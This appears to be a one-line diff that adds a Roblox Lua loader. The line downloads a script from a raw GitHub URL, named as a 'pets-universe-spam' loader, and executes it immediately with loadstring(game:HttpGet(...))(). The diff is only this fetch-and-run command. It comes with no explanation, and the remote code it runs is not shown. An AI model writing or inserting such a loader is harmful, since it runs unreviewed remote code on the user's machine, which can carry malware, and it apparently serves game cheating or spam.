@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/pets-universe-spam0-t493ipzcfir8vv.lua"))()
